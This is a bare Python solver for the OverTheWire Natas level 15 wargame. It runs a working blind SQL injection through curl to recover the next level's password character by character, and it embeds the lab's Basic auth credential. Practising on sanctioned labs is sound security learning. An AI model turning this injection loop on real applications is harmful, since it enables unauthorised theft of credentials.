#!/usr/bin/env python3
import subprocess, string

password = ['']*32
for i in range(32):
    for c in string.printable:
        password[i] = c

        p = subprocess.run("curl 'http://natas15.natas.labs.overthewire.org/index.php?debug' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' -H 'Origin: http://natas15.natas.labs.overthewire.org' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Referer: http://natas15.natas.labs.overthewire.org/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7' --data 'username=natas16\" and password like binary \"%s%%\" #' --compressed --insecure -s" % (''.join(password),), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        print(p.stdout.decode().split('div')[1])
        if not "This user doesn't exist." in p.stdout.decode():
            break
print(''.join(password))
